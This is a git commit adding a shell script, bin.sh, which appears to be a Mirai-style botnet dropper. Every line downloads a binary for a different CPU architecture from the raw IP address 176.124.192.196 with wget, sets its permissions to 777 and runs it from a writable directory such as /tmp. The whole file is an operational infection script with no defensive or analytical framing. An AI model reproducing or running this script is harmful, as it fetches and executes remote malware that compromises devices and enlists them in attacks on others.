4cc501a703e7270da386bc74e536a1b665294775
ugolovnik <81182052+ugolovnik@users.noreply.github.com>
2024-01-02 00:54:19 +0300

    Add files via upload

---
+++ bin.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget http://176.124.192.196/bins/VRx86 ; chmod 777 VRx86 ; ./VRx86 root.wget.x86;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget http://176.124.192.196/bins/VRarm ; chmod 777 VRarm; ./VRarm root.wget.arm;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget http://176.124.192.196/bins/VRarm7 ; chmod 777 VRarm7 ; ./VRarm7 root.wget.arm7;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget http://176.124.192.196/bins/VRm68k ; chmod 777 VRm68k ; ./VRm68k root.wget.m68k;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget http://176.124.192.196/bins/VRmips ; chmod 777 VRmips ; ./VRmips root.wget.mips;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget http://176.124.192.196/bins/VRmpsl ; chmod 777 VRmpsl ; ./VRmpsl root.wget.mpsl;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget http://176.124.192.196/bins/VRppc ; chmod 777 VRppc ; ./VRppc root.wget.ppc;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget http://176.124.192.196/bins/VRsh4 ; chmod 777 VRsh4 ; ./VRsh4 root.wget.sh4;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;wget http://176.124.192.196/bins/VRspc ; chmod 777 VRspc ; ./VRspc root.wget.spc;
